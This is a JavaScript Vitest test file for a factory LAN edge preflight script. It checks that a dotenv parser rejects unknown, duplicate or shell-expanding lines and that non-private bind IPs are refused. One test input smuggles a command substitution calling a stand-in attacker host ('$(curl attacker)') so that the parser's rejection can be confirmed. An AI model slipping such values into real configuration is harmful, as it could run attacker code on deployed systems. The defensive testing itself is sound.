import { describe, expect, it } from "vitest";
import {
  parseEdgeEnvironment,
  verifyEdgeInstallation,
} from "../scripts/edge/verify-edge-configuration.mjs";

describe("LAN edge operator preflight", () => {
  it("parses only known dotenv keys without shell evaluation", () => {
    expect(parseEdgeEnvironment("# comment\nEDGE_HOSTNAME=erp.factory.internal\nEDGE_WRITE_MODE=read-only\n"))
      .toMatchObject({ EDGE_HOSTNAME: "erp.factory.internal", EDGE_WRITE_MODE: "read-only" });
    expect(() => parseEdgeEnvironment("EDGE_X=$(curl attacker)")).toThrow("EDGE_ENV_UNRECOGNIZED_LINE");
    expect(() => parseEdgeEnvironment("EDGE_HOSTNAME=x\nEDGE_HOSTNAME=y")).toThrow("EDGE_ENV_DUPLICATE_KEY");
    expect(() => parseEdgeEnvironment("EDGE_HOSTNAME=$ENV")).toThrow("EDGE_ENV_UNSAFE_VALUE");
  });
  it("rejects a nonprivate LAN bind IP before reading credentials", () => {
    expect(() => verifyEdgeInstallation({ EDGE_BIND_IP: "0.0.0.0" }, "", ""))
      .toThrow("EDGE_BIND_IP_NOT_PRIVATE");
    expect(() => verifyEdgeInstallation({ EDGE_BIND_IP: "8.8.8.8" }, "", ""))
      .toThrow("EDGE_BIND_IP_NOT_PRIVATE");
    expect(() => verifyEdgeInstallation({ EDGE_BIND_IP: "127.0.0.1" }, "", ""))
      .toThrow("EDGE_BIND_IP_NOT_PRIVATE");
  });
});
